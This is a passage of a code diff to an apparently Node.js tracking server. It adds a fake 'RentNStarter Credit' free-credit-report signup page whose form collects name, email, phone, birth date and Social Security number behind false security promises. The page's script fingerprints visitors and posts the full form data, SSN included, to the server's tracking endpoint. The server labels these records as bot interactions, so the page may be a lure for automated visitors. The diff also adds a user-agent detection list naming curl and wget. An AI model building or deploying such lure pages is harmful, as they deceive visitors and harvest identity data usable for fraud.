Report & Score</h1><p>Monitor your credit health with real-time alerts, personalized insights, and identity protection. No credit card required to get started.</p></div></section><section class="main-content"><div class="form-header"><h2>Create Your Free Account</h2><p>Step 1 of 3: Personal Information</p><div class="step-indicator"><div class="step active">1</div><div class="step">2</div><div class="step">3</div></div><div class="progress-bar"><div class="progress-fill"></div></div></div><form id="signupForm"><div class="form-group"><label for="firstName">First Name *</label><input type="text" id="firstName" name="firstName" class="form-control" required></div><div class="form-group"><label for="lastName">Last Name *</label><input type="text" id="lastName" name="lastName" class="form-control" required></div><div class="form-group"><label for="email">Email Address *</label><input type="email" id="email" name="email" class="form-control" required></div><div class="form-group"><label for="phone">Phone Number *</label><input type="tel" id="phone" name="phone" class="form-control" placeholder="(555) 123-4567" required></div><div class="form-row"><div class="form-group"><label for="birthMonth">Birth Month *</label><select id="birthMonth" name="birthMonth" class="form-control" required><option value="">Select Month</option><option value="01">January</option><option value="02">February</option><option value="03">March</option><option value="04">April</option><option value="05">May</option><option value="06">June</option><option value="07">July</option><option value="08">August</option><option value="09">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select></div><div class="form-group"><label for="birthYear">Birth Year *</label><select id="birthYear" name="birthYear" class="form-control" required><option value="">Select Year</option></select></div></div><div class="form-group"><label for="ssn">Social Security Number *</label><input type="password" id="ssn" name="ssn" class="form-control" placeholder="XXX-XX-XXXX" maxlength="11" required></div><div class="security-notice"><i class="fas fa-lock"></i><strong>Your information is secure.</strong> We use bank-level encryption to protect your personal data and will never sell your information to third parties.</div><button type="submit" class="btn-primary" onclick="submitStep1()"><i class="fas fa-arrow-right" style="margin-left: 0.5rem;"></i> Continue to Step 2</button><div class="legal-text">By clicking Continue, you acknowledge that you have read and agree to our <a href="#" style="color: #003d82;">Terms of Service</a> and <a href="#" style="color: #003d82;">Privacy Policy</a>. You also agree to receive marketing communications from RentNStarter Credit and our partners. You must be at least 18 years old to create an account.</div></form></section><section class="features" id="features"><div class="container"><h2 style="text-align: center; color: #003d82; margin-bottom: 2rem;">What You Get With RentNStarter Credit</h2><div class="features-grid"><div class="feature"><i class="fas fa-chart-line"></i><h3>Free Credit Score & Report</h3><p>Get your TransUnion credit score and report updated daily. See what factors are impacting your score the most.</p></div><div class="feature"><i class="fas fa-bell"></i><h3>Credit Monitoring & Alerts</h3><p>Receive instant notifications when important changes occur on your credit report that could indicate fraud.</p></div><div class="feature"><i class="fas fa-user-shield"></i><h3>Identity Protection</h3><p>Monitor your personal information across the dark web and get alerts if your data is compromised.</p></div><div class="feature"><i class="fas fa-lightbulb"></i><h3>Personalized Insights</h3><p>Get tailored recommendations to improve your credit score and financial health based on your unique profile.</p></div><div class="feature"><i class="fas fa-credit-card"></i><h3>Pre-Qualified Offers</h3><p>See credit card and loan offers you are likely to qualify for without impacting your credit score.</p></div><div class="feature"><i class="fas fa-mobile-alt"></i><h3>Mobile App Access</h3><p>Access your credit information anytime, anywhere with our highly-rated mobile app for iOS and Android.</p></div></div></div></section><footer class="footer" id="support"><div class="container"><div class="footer-content"><div><h4>RentNStarter Credit</h4><p>Helping millions of Americans understand and improve their credit health since 2024.</p></div><div><h4>Products</h4><a href="#">Free Credit Monitoring</a><br><a href="#">Credit Score Tracking</a><br><a href="#">Identity Protection</a><br><a href="#">Financial Tools</a></div><div><h4>Support</h4><a href="#">Help Center</a><br><a href="#">Contact Us</a><br><a href="#">Privacy Policy</a><br><a href="#">Terms of Service</a></div><div><h4>Company</h4><a href="#">About Us</a><br><a href="#">Careers</a><br><a href="#">Press</a><br><a href="#">Blog</a></div></div><div style="text-align: center; margin-top: 2rem; padding-top: 2rem; border-top: 1px solid #0056b3;"><p>&copy; 2024 RentNStarter Credit. All rights reserved. RentNStarter is a registered trademark.</p></div></div></footer><script>// Enhanced client-side tracking fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "page_loaded", screen: {width: screen.width, height: screen.height}, viewport: {width: window.innerWidth, height: window.innerHeight}, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, userAgent: navigator.userAgent, platform: navigator.platform, pageUrl: window.location.href, referrer: document.referrer, timestamp: new Date().toISOString() }) }).catch(() => {}); // Populate birth year dropdown const birthYearSelect = document.getElementById("birthYear"); const currentYear = new Date().getFullYear(); for (let year = currentYear - 18; year >= currentYear - 100; year--) { const option = document.createElement("option"); option.value = year; option.textContent = year; birthYearSelect.appendChild(option); } // Format SSN input document.getElementById("ssn").addEventListener("input", function(e) { let value = e.target.value.replace(/\D/g, ""); if (value.length >= 6) { value = value.substring(0,3) + "-" + value.substring(3,5) + "-" + value.substring(5,9); } else if (value.length >= 4) { value = value.substring(0,3) + "-" + value.substring(3); } e.target.value = value; }); // Format phone input document.getElementById("phone").addEventListener("input", function(e) { let value = e.target.value.replace(/\D/g, ""); if (value.length >= 7) { value = "(" + value.substring(0,3) + ") " + value.substring(3,6) + "-" + value.substring(6,10); } else if (value.length >= 4) { value = "(" + value.substring(0,3) + ") " + value.substring(3); } else if (value.length > 0) { value = "(" + value; } e.target.value = value; }); // Track form interactions document.querySelectorAll("input, select").forEach(element => { element.addEventListener("focus", function() { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_field_focus", field: this.name || this.id, timestamp: new Date().toISOString() }) }).catch(() => {}); }); element.addEventListener("blur", function() { if (this.value) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_field_filled", field: this.name || this.id, hasValue: !!this.value, timestamp: new Date().toISOString() }) }).catch(() => {}); } }); }); function submitStep1() { event.preventDefault(); const formData = new FormData(document.getElementById("signupForm")); const data = {}; for (let [key, value] of formData.entries()) { data[key] = value; } // Track form submission fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "form_submission_attempt", step: 1, formData: data, timestamp: new Date().toISOString() }) }).catch(() => {}); // Simulate validation if (!data.firstName || !data.lastName || !data.email || !data.ssn) { alert("Please fill in all required fields."); return; } // Simulate moving to step 2 document.querySelector(".progress-fill").style.width = "66%"; document.querySelectorAll(".step")[0].classList.remove("active"); document.querySelectorAll(".step")[0].classList.add("completed"); document.querySelectorAll(".step")[1].classList.add("active"); document.querySelector(".form-header p").textContent = "Step 2 of 3: Address Information"; // Track successful step completion fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "step_completed", step: 1, timestamp: new Date().toISOString() }) }).catch(() => {}); alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process."); } // Track scroll depth let maxScroll = 0; window.addEventListener("scroll", function() { const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100); if (scrollPercent > maxScroll) { maxScroll = scrollPercent; if (maxScroll % 25 === 0) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "scroll_depth", percentage: maxScroll, timestamp: new Date().toISOString() }) }).catch(() => {}); } } }); // Track time on page let timeOnPage = 0; setInterval(() => { timeOnPage += 10; if (timeOnPage % 30 === 0) { fetch("/api/js-track/' + trackingId + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ action: "time_on_page", seconds: timeOnPage, timestamp: new Date().toISOString() }) }).catch(() => {}); } }, 10000);</script></body></html>';
 }
 
 // Extract tracking logic to reusable function
@@ -485,8 +231,6 @@ function handleTracking(req, res, trackingId) {
     if (trackingData.has(trackingId)) {
         trackingData.get(trackingId).clicks.push(clientInfo);
         console.log('Bot interaction: ' + clientInfo.ip + ' - ' + clientInfo.userAgent);
-        // Save data after each click
-        saveData();
     } else {
         console.log('Unknown tracking ID accessed: ' + trackingId);
     }
@@ -512,8 +256,9 @@ function handleTracking(req, res, trackingId) {
             break;
             
         case 'resume':
+        case 'credit':
         default:
-            res.send(generateResumeOptimizerHTML(trackingId));
+            res.send(generateCreditMonitoringHTML(trackingId));
             break;
     }
 }
@@ -565,13 +310,67 @@ app.post('/api/js-track/:id', (req, res) => {
     
     if (trackingData.has(trackingId)) {
         trackingData.get(trackingId).clicks.push(jsInfo);
-        // Save data after JavaScript tracking
-        saveData();
     }
     
     saveInteraction(trackingId, jsInfo);
     res.json({ success: true });
 });
+
+// Extract comprehensive client information
+function extractClientInfo(req) {
+    const ip = getClientIP(req);
+    
+    return {
+        timestamp: new Date().toISOString(),
+        ip: ip,
+        userAgent: req.headers['user-agent'] || 'Unknown',
+        referer: req.headers['referer'] || 'Direct',
+        acceptLanguage: req.headers['accept-language'] || 'Unknown',
+        acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
+        host: req.headers['host'],
+        method: req.method,
+        url: req.url,
+        query: req.query,
+        xForwardedFor: req.headers['x-forwarded-for'],
+        xRealIp: req.headers['x-real-ip'],
+        cfConnectingIp: req.headers['cf-connecting-ip'],
+        isBot: detectBot(req.headers['user-agent'] || ''),
+        botScore: calculateBotScore(req.headers)
+    };
+}
+
+// Enhanced bot detection
+function detectBot(userAgent) {
+    const botKeywords = [
+        'bot', 'crawler', 'spider', 'scraper', 'automated',
+        'python', 'curl', 'wget', 'requests', 'selenium',
+        'headless', 'phantom', 'zombie', 'mechanize'
+    ];
+    
+    const ua = userAgent.toLowerCase();
+    return botKeywords.some(keyword => ua.includes(keyword));
+}
+
+// Calculate bot probability score
+function calculateBotScore(headers) {
+    let score = 0;
+    
+    if (!headers['accept-language']) score += 20;
+    if (!headers['accept-encoding']) score += 15;
+    if (!headers['accept']) score += 10;
+    
+    const ua = (headers['user-agent'] || '').toLowerCase();
+    if (ua.includes('python')) score += 30;
+    if (ua.includes('curl')) score += 30;
+    if (ua.includes('wget')) score += 30;
+    if (ua === '') score += 25;
+    
+    if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
+        score += 15;
+    }
+    
+    return Math.min(score, 100);
+}
 
 // Save interaction to persistent log
 function saveInteraction(trackingId, clientInfo) {
@@ -603,6 +402,33 @@ app.get('/api/stats/:id', requireAuth, (req, res) => {
     const data = trackingData.get(trackingId);
     const clicks = data.clicks || [];
     
+    // Get last 50 clicks for detailed view
+    const recentClicks = clicks.slice(-50).map(click => ({
+        timestamp: click.timestamp,
+        ip: click.ip,
+        userAgent: click.userAgent || 'Unknown',
+        referer: click.referer || 'Direct',
+        acceptLanguage: click.acceptLanguage || 'Unknown',
+        isBot: click.isBot || false,
+        botScore: click.botScore || 0,
+        type: click.type || 'page_visit'
+    }));
+    
+    // Calculate top user agents
+    const uaMap = {};
+    clicks.forEach(click => {
+        const ua = click.userAgent || 'Unknown';
+        uaMap[ua] = (uaMap[ua] || 0) + 1;
+    });
+    
+    const topUserAgents = Object.entries(uaMap)
+        .sort(([,a], [,b]) => b - a)
+        .slice(0, 10)
+        .map(([ua, count]) => ({
+            userAgent: ua.length > 60 ? ua.substring(0, 60) + '...' : ua,
+            count: count
+        }));
+    
     res.json({
         trackingId: trackingId,
         created: data.created,
@@ -611,11 +437,12 @@ app.get('/api/stats/:id', requireAuth, (req, res) => {
         totalClicks: clicks.length,
         uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
         botClicks: clicks.filter(c => c.isBot).length,
+        humanClicks: clicks.filter(c => !c.isBot).length,
         avgBotScore: clicks.length > 0 ? 
-            clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length : 0,
-        recentClicks: clicks.slice(-10),
-        topUserAgents: getTopUserAgents(clicks),
-        clicksByHour: getClicksByHour(clicks)
+            Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0,
+        recentClicks: recentClicks,
+        topUserAgents: topUserAgents,
+        lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null
     });
 });
 
@@ -681,987 +508,9 @@ app.get('/api/dashboard', requireAuth, (req, res) => {
     });
 });
 
-// Export all data as CSV
-app.get('/api/export/csv', requireAuth, (req, res) => {
-    const csv = ['Timestamp,IP,UserAgent,IsBot,BotScore,Campaign,Description,Referrer'];
-    
-    trackingData.forEach((data, trackingId) => {
-        data.clicks.forEach(click => {
-            csv.push([
-                click.timestamp,
-                click.ip,
-                `"${(click.userAgent || '').replace(/"/g, '""')}"`,
-                click.isBot,
-                click.botScore,
-                data.campaign,
-                data.description,
-                click.referer || 'Direct'
-            ].join(','));
-        });
-    });
-    
-    res.setHeader('Content-Type', 'text/csv');
-    res.setHeader('Content-Disposition', 'attachment; filename="visitor-data.csv"');
-    res.send(csv.join('\n'));
-});
-
-// Get detailed visitor profile
-app.get('/api/visitor/:ip', requireAuth, (req, res) => {
-    const targetIP = req.params.ip;
-    const visits = [];
-    
-    trackingData.forEach((data, trackingId) => {
-        const ipVisits = data.clicks.filter(click => click.ip === targetIP);
-        ipVisits.forEach(visit => {
-            visits.push({
-                ...visit,
-                campaign: data.campaign,
-                trackingId: trackingId
-            });
-        });
-    });
-    
-    res.json({
-        ip: targetIP,
-        totalVisits: visits.length,
-        firstSeen: visits.length > 0 ? visits[visits.length - 1].timestamp : null,
-        lastSeen: visits.length > 0 ? visits[0].timestamp : null,
-        visits: visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-    });
-});
-
-// Enhanced dashboard HTML
+// Simple dashboard with comprehensive analytics
 app.get('/dashboard', (req, res) => {
-    res.send(`<!DOCTYPE html>
-<html>
-<head>
-    <title>ResumeBoost Pro - Enhanced Analytics Dashboard</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            min-height: 100vh;
-            color: #333;
-        }
-        
-        .container { 
-            max-width: 1400px; 
-            margin: 0 auto; 
-            padding: 20px;
-        }
-        
-        .main-card {
-            background: white; 
-            border-radius: 16px; 
-            box-shadow: 0 20px 60px rgba(0,0,0,0.1); 
-            padding: 30px;
-            margin-bottom: 20px;
-        }
-        
-        h1 { 
-            color: #667eea; 
-            text-align: center; 
-            margin-bottom: 10px;
-            font-size: 2.5em;
-        }
-        
-        .subtitle {
-            text-align: center;
-            color: #666;
-            margin-bottom: 30px;
-        }
-        
-        .auth { 
-            background: #f8f9ff; 
-            border-radius: 12px; 
-            border: 2px solid #e0e6ff;
-            padding: 25px;
-            margin-bottom: 30px;
-        }
-        
-        input, select { 
-            width: 100%; 
-            padding: 14px; 
-            margin: 10px 0; 
-            border: 2px solid #e0e6ff; 
-            border-radius: 8px; 
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        
-        input:focus, select:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        
-        button { 
-            background: #667eea; 
-            color: white; 
-            padding: 14px 28px; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-weight: 600;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        button:hover {
-            background: #5a6fd8;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
-        }
-        
-        .hidden { display: none; }
-        
-        .stats { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
-            gap: 20px; 
-            margin: 30px 0; 
-        }
-        
-        .stat { 
-            background: linear-gradient(135deg, #667eea, #764ba2); 
-            color: white; 
-            padding: 25px; 
-            border-radius: 12px; 
-            text-align: center;
-            transition: transform 0.3s;
-        }
-        
-        .stat:hover {
-            transform: translateY(-3px);
-        }
-        
-        .stat h3 { 
-            margin: 0; 
-            font-size: 3em;
-            font-weight: 700;
-        }
-        
-        .stat p {
-            margin-top: 5px;
-            opacity: 0.9;
-            font-size: 1.1em;
-        }
-        
-        .tabs { 
-            display: flex; 
-            border-bottom: 2px solid #e0e6ff; 
-            margin: 30px 0 20px 0;
-            overflow-x: auto;
-        }
-        
-        .tab { 
-            padding: 12px 24px; 
-            cursor: pointer; 
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s;
-            white-space: nowrap;
-            font-weight: 500;
-        }
-        
-        .tab.active { 
-            border-bottom-color: #667eea; 
-            color: #667eea; 
-            font-weight: 600;
-        }
-        
-        .tab:hover { 
-            background: #f8f9ff;
-        }
-        
-        .visitor-card {
-            background: #fff;
-            border: 2px solid #e0e6ff;
-            border-radius: 12px;
-            margin: 20px 0;
-            overflow: hidden;
-            transition: all 0.3s;
-        }
-        
-        .visitor-card:hover {
-            border-color: #667eea;
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.1);
-        }
-        
-        .visitor-header {
-            background: #f8f9ff;
-            padding: 20px;
-            border-bottom: 1px solid #e0e6ff;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .visitor-header:hover {
-            background: #f0f4ff;
-        }
-        
-        .visitor-main-info {
-            flex: 1;
-        }
-        
-        .visitor-timestamp {
-            font-size: 1.2em;
-            font-weight: 600;
-            color: #667eea;
-            margin-bottom: 8px;
-        }
-        
-        .visitor-summary {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-            color: #666;
-        }
-        
-        .visitor-details {
-            padding: 0;
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease-out;
-            background: #fafbff;
-        }
-        
-        .visitor-details.show {
-            max-height: 1000px;
-            padding: 25px;
-        }
-        
-        .detail-section {
-            margin-bottom: 25px;
-        }
-        
-        .detail-section h4 {
-            color: #667eea;
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .detail-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 15px;
-        }
-        
-        .detail-item {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #e0e6ff;
-        }
-        
-        .detail-label {
-            font-weight: 600;
-            color: #555;
-            font-size: 0.9em;
-            margin-bottom: 4px;
-        }
-        
-        .detail-value {
-            font-family: 'SF Mono', Monaco, 'Courier New', monospace;
-            color: #333;
-            word-break: break-all;
-            font-size: 0.95em;
-        }
-        
-        .bot-indicator {
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.9em;
-            font-weight: 600;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        .bot-indicator.bot {
-            background: #fee2e2;
-            color: #dc2626;
-        }
-        
-        .bot-indicator.human {
-            background: #d1fae5;
-            color: #065f46;
-        }
-        
-        .bot-indicator.suspicious {
-            background: #fef3c7;
-            color: #92400e;
-        }
-        
-        .ip-badge {
-            background: #e0e7ff;
-            color: #4338ca;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 0.9em;
-        }
-        
-        .location-badge {
-            background: #fce7f3;
-            color: #9f1239;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 0.9em;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #e0e6ff;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-top: 5px;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            transition: width 0.3s;
-        }
-        
-        .error { color: #ef4444; }
-        .success { color: #10b981; }
-        
-        .empty-state {
-            text-align: center;
-            padding: 60px 20px;
-            color: #999;
-        }
-        
-        .empty-state-icon {
-            font-size: 4em;
-            margin-bottom: 20px;
-            opacity: 0.3;
-        }
-        
-        @media (max-width: 768px) {
-            .container { padding: 10px; }
-            .main-card { padding: 20px; }
-            .stats { grid-template-columns: 1fr 1fr; }
-            .detail-grid { grid-template-columns: 1fr; }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="main-card">
-            <h1>📊 ResumeBoost Pro Analytics</h1>
-            <p class="subtitle">Advanced Visitor Tracking & Bot Detection System</p>
-            
-            <div class="auth">
-                <h3>🔐 Authentication Required</h3>
-                <input type="password" id="token" placeholder="Enter admin token" onkeypress="if(event.key==='Enter') authenticate()">
-                <button onclick="authenticate()">🚀 Connect to Dashboard</button>
-                <button onclick="refreshData()" id="refreshBtn" style="margin-left: 10px; background: #10b981; display: none;">🔄 Refresh</button>
-                <button onclick="exportCSV()" id="exportBtn" style="margin-left: 10px; background: #ec4899; display: none;">📥 Export CSV</button>
-                <button onclick="logout()" id="logoutBtn" style="margin-left: 10px; background: #ef4444; display: none;">🚪 Logout</button>
-                <div id="status" style="margin-top: 15px;"></div>
-            </div>
-            
-            <div id="dashboard" class="hidden">
-                <div class="stats">
-                    <div class="stat">
-                        <h3 id="totalLinks">0</h3>
-                        <p>Campaign Links</p>
-                    </div>
-                    <div class="stat">
-                        <h3 id="totalClicks">0</h3>
-                        <p>Total Visits</p>
-                    </div>
-                    <div class="stat">
-                        <h3 id="totalBots">0</h3>
-                        <p>Bot Detections</p>
-                    </div>
-                    <div class="stat">
-                        <h3 id="botPercentage">0%</h3>
-                        <p>Bot Rate</p>
-                    </div>
-                </div>
-                
-                <div class="tabs">
-                    <div class="tab active" onclick="showTab(this, 'visitors')">👥 Recent Visitors</div>
-                    <div class="tab" onclick="showTab(this, 'campaigns')">📈 Campaign Analytics</div>
-                    <div class="tab" onclick="showTab(this, 'create')">🔗 Create Campaign</div>
-                </div>
-                
-                <div id="visitorsTab">
-                    <h3 style="margin-bottom: 20px;">🕐 Live Visitor Feed</h3>
-                    <div id="visitorsList">
-                        <div class="empty-state">
-                            <div class="empty-state-icon">📊</div>
-                            <p>Loading visitor data...</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div id="campaignsTab" class="hidden">
-                    <h3 style="margin-bottom: 20px;">📊 Campaign Performance</h3>
-                    <div id="campaignsList">
-                        <div class="empty-state">
-                            <div class="empty-state-icon">📈</div>
-                            <p>Loading campaigns...</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div id="createTab" class="hidden">
-                    <div style="background: #f8f9ff; padding: 25px; border-radius: 12px;">
-                        <h3 style="margin-bottom: 20px;">🔗 Create New Campaign Link</h3>
-                        <input type="text" id="description" placeholder="Campaign description (e.g., Email Newsletter - Q1 2024)">
-                        <input type="text" id="campaign" placeholder="Campaign name (e.g., spring-promo-2024)">
-                        <select id="urlType">
-                            <option value="friendly">🌟 Friendly URL</option>
-                            <option value="promo">🎁 Promo Code</option>
-                            <option value="company">🏢 Company Application</option>
-                            <option value="tool">🛠️ Tool URL</option>
-                        </select>
-                        <input type="text" id="customPath" placeholder="Custom path (optional, e.g., special-offer)">
-                        <button onclick="createLink()" style="width: 100%; margin-top: 15px;">
-                            ✨ Generate Tracking Link
-                        </button>
-                        <div id="result" style="margin-top: 20px;"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        let token = localStorage.getItem('adminToken') || "";
-        let allVisitors = [];
-        let refreshInterval;
-        
-        // Check if already authenticated on page load
-        document.addEventListener('DOMContentLoaded', () => {
-            if (token) {
-                // Try to authenticate with saved token
-                authenticate(true);
-            } else {
-                document.getElementById('token').focus();
-            }
-        });
-        
-        function authenticate(isAutoLogin = false) {
-            if (!isAutoLogin) {
-                token = document.getElementById("token").value;
-            }
-            
-            fetch("/api/dashboard", {
-                headers: { "Authorization": "Bearer " + token }
-            })
-            .then(r => {
-                if (!r.ok) {
-                    throw new Error("Invalid token");
-                }
-                return r.json();
-            })
-            .then(data => {
-                // Save token to localStorage on successful auth
-                localStorage.setItem('adminToken', token);
-                document.getElementById("token").value = token;
-                document.getElementById("status").innerHTML = '<span class="success">✅ Connected successfully!</span>';
-                document.getElementById("dashboard").classList.remove("hidden");
-                document.getElementById("refreshBtn").style.display = "inline-block";
-                document.getElementById("exportBtn").style.display = "inline-block";
-                document.getElementById("logoutBtn").style.display = "inline-block";
-                updateDashboard(data);
-                startAutoRefresh();
-            })
-            .catch(e => {
-                if (isAutoLogin) {
-                    // Clear invalid saved token
-                    localStorage.removeItem('adminToken');
-                    token = "";
-                    document.getElementById('token').focus();
-                } else {
-                    document.getElementById("status").innerHTML = '<span class="error">❌ ' + e.message + '</span>';
-                }
-            });
-        }
-        
-        function logout() {
-            localStorage.removeItem('adminToken');
-            token = "";
-            location.reload();
-        }
-        
-        function startAutoRefresh() {
-            if (refreshInterval) clearInterval(refreshInterval);
-            refreshInterval = setInterval(() => {
-                if (token && !document.getElementById("dashboard").classList.contains("hidden")) {
-                    refreshData();
-                }
-            }, 10000); // Refresh every 10 seconds
-        }
-        
-        function refreshData() {
-            if (!token) return;
-            fetch("/api/dashboard", {
-                headers: { "Authorization": "Bearer " + token }
-            })
-            .then(r => r.json())
-            .then(data => updateDashboard(data))
-            .catch(e => console.error("Refresh failed:", e));
-        }
-        
-        function exportCSV() {
-            if (!token) return;
-            fetch("/api/export/csv", {
-                headers: { "Authorization": "Bearer " + token }
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Export failed');
-                return response.blob();
-            })
-            .then(blob => {
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'visitor-data.csv';
-                a.click();
-                window.URL.revokeObjectURL(url);
-            })
-            .catch(e => {
-                alert('Export failed: ' + e.message);
-            });
-        }
-        
-        function updateDashboard(data) {
-            // Update stats
-            document.getElementById("totalLinks").textContent = data.totalLinks;
-            document.getElementById("totalClicks").textContent = data.totalClicks;
-            document.getElementById("totalBots").textContent = data.totalBots;
-            document.getElementById("botPercentage").textContent = data.botPercentage + "%";
-            
-            // Collect all visitors from all campaigns
-            allVisitors = [];
-            data.links.forEach(link => {
-                if (link.recentClicks && link.recentClicks.length > 0) {
-                    link.recentClicks.forEach(click => {
-                        allVisitors.push({
-                            ...click,
-                            campaign: link.campaign,
-                            description: link.description,
-                            trackingId: link.trackingId
-                        });
-                    });
-                }
-            });
-            
-            // Sort by timestamp (newest first)
-            allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-            
-            // Update visitors list
-            updateVisitorsList(allVisitors.slice(0, 50)); // Show last 50 visitors
-            
-            // Update campaigns list
-            updateCampaignsList(data.links);
-        }
-        
-        function updateVisitorsList(visitors) {
-            const container = document.getElementById("visitorsList");
-            
-            if (visitors.length === 0) {
-                container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">👥</div><p>No visitors recorded yet.</p></div>';
-                return;
-            }
-            
-            container.innerHTML = visitors.map((visitor, index) => {
-                const timeDiff = getTimeDifference(visitor.timestamp);
-                const botClass = visitor.isBot ? 'bot' : (visitor.botScore > 50 ? 'suspicious' : 'human');
-                const botIcon = visitor.isBot ? '🤖' : (visitor.botScore > 50 ? '🤔' : '👤');
-                
-                return \`
-                    <div class="visitor-card">
-                        <div class="visitor-header" onclick="toggleVisitor('visitor-\${index}')">
-                            <div class="visitor-main-info">
-                                <div class="visitor-timestamp">\${timeDiff}</div>
-                                <div class="visitor-summary">
-                                    <span class="ip-badge">\${visitor.ip || 'Unknown IP'}</span>
-                                    <span class="bot-indicator \${botClass}">
-                                        \${botIcon} \${visitor.isBot ? 'Bot' : (visitor.botScore > 50 ? 'Suspicious' : 'Human')} 
-                                        (\${visitor.botScore || 0}%)
-                                    </span>
-                                    <span class="location-badge">📍 \${visitor.acceptLanguage || 'Unknown'}</span>
-                                    <span style="color: #666;">Campaign: \${visitor.campaign}</span>
-                                </div>
-                            </div>
-                            <div style="font-size: 1.5em; color: #667eea;">
-                                \${visitor.data ? '📱' : '💻'}
-                            </div>
-                        </div>
-                        <div class="visitor-details" id="visitor-\${index}">
-                            \${formatVisitorDetails(visitor)}
-                        </div>
-                    </div>
-                \`;
-            }).join('');
-        }
-        
-        function formatVisitorDetails(visitor) {
-            let html = '';
-            
-            // Browser & System Info
-            html += \`
-                <div class="detail-section">
-                    <h4>🌐 Browser & System</h4>
-                    <div class="detail-grid">
-                        <div class="detail-item">
-                            <div class="detail-label">User Agent</div>
-                            <div class="detail-value">\${visitor.userAgent || 'Not provided'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Accept Language</div>
-                            <div class="detail-value">\${visitor.acceptLanguage || 'Not provided'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Accept Encoding</div>
-                            <div class="detail-value">\${visitor.acceptEncoding || 'Not provided'}</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">Referrer</div>
-                            <div class="detail-value">\${visitor.referer || 'Direct'}</div>
-                        </div>
-                    </div>
-                </div>
-            \`;
-            
-            // JavaScript Data (if available)
-            if (visitor.data) {
-                const data = visitor.data;
-                html += \`
-                    <div class="detail-section">
-                        <h4>📱 Device Information</h4>
-                        <div class="detail-grid">
-                            <div class="detail-item">
-                                <div class="detail-label">Screen Resolution</div>
-                                <div class="detail-value">\${data.screen ? \`\${data.screen.width}x\${data.screen.height}\` : 'Unknown'}</div>
-                            </div>
-                            <div class="detail-item">
-                                <div class="detail-label">Viewport Size</div>
-                                <div class="detail-value">\${data.viewport ? \`\${data.viewport.width}x\${data.viewport.height}\` : 'Unknown'}</div>
-                            </div>
-                            <div class="detail-item">
-                                <div class="detail-label">Timezone</div>
-                                <div class="detail-value">\${data.timezone || 'Unknown'}</div>
-                            </div>
-                            <div class="detail-item">
-                                <div class="detail-label">Platform</div>
-                                <div class="detail-value">\${data.platform || 'Unknown'}</div>
-                            </div>
-                            <div class="detail-item">
-                                <div class="detail-label">Language</div>
-                                <div class="detail-value">\${data.language || 'Unknown'}</div>
-                            </div>
-                            <div class="detail-item">
-                                <div class="detail-label">Canvas Fingerprint</div>
